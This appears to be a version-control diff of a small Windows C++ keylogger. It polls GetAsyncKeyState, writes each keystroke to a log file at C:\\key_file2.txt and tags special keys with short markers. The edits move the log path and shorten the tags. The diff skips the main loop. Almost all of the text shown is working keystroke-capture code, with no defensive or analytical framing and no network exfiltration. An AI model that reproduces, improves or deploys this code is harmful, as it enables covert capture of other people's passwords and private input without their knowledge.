@@ -2,20 +2,22 @@
 #include <windows.h>
 //#include <conio.h>
 #include <fstream>
+#include <cstdlib>
 
 using namespace std;
 
 int keys(char key, fstream&);
 
 int main(){
-
   char key_press;
   int ascii_value;
 
   fstream afile;
 
-  afile.open("key_file2.txt", ios::in | ios::out);
+  afile.open("C:\\key_file2.txt", ios::in | ios::out);
   afile.close();
+  
+ 
 
   while(true){
 
@@ -43,33 +45,34 @@ int main(){
   return 0;
 }
 
+
 int keys(char key, fstream& file){
 
-  file.open("key_file.txt", ios::app | ios::in | ios::out);
+  file.open("C:\\key_file2.txt", ios::app | ios::in | ios::out);
   if(file){
     if(GetAsyncKeyState(VK_SHIFT)){
-      file << "[SHIFT]";
+      file << "[^]";
     }
     else if(GetAsyncKeyState(VK_ESCAPE)){
-      file << "[ESCAPE]";
+      file << "[ESC]";
     }
     else if(GetAsyncKeyState(VK_RETURN)){
-      file << "[ENTER]";
+      file << "[->]";
     }
     else if(GetAsyncKeyState(VK_CONTROL)){
-      file << "[CONTROL]";
+      file << "[CTR]";
     }
     else if(GetAsyncKeyState(VK_MENU)){
       file << "[ALT]";
     }
     else if(GetAsyncKeyState(VK_DELETE)){
-      file << "[DELETE]";
+      file << "[DEL]";
     }
     else if(GetAsyncKeyState(VK_TAB)){
       file << "[TAB]";
     }
     else if(GetAsyncKeyState(VK_BACK)){
-      file << "[BACKSPACE]";
+      file << "[<-]";
     }
     else{
       file << key;
